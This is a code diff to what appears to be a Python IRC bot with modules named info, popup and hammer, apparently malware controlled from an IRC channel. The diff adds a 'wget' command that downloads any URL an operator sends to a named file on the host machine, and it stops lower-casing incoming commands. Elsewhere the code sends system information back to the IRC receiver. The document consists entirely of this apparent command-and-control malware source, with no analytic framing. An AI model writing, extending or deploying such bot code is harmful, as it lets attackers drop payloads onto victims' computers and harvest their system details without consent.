@@ -15,6 +15,7 @@ import socket
 import getpass
 import threading
 
+from modules import wget
 from modules import info
 from modules import popup
 from modules import hammer
@@ -96,6 +97,20 @@ def run(msg, priv=False):
 		for inf in sysinfo:
 			text = inf[0] + ": " + inf[1] 
 			send("PRIVMSG %s :%s"%(receiver, text))
+
+	elif message[0] == "wget":
+		if len(message) > 2:
+			fileUrl  = message[1]
+			fileName = ' '.join(message[2:]) 
+
+			res = wget.run(fileUrl, fileName)
+
+			if res != True:
+				send("PRIVMSG %s :%s"%(receiver, res))
+
+		else:
+			send("PRIVMSG %s :%s"%(receiver, wget.usage))
+
 	else:
 		pass
 
@@ -110,14 +125,14 @@ def main():
 			send("PONG " + msg[1])
 
 		elif BASE in msg[0] and msg[2] == CHNL:
-			msg = ' '.join(msg[3:])[1:].lower()
+			msg = ' '.join(msg[3:])[1:]
 			print BASE + " - " + CHNL + " -> " + msg
 			
 			run(msg)
 
 
 		elif BASE in msg[0] and msg[2] == NICK:
-			msg = ' '.join(msg[3:])[1:].lower()
+			msg = ' '.join(msg[3:])[1:]
 			print BASE + " - " + NICK + " -> " + msg
 
 			run(msg, True)
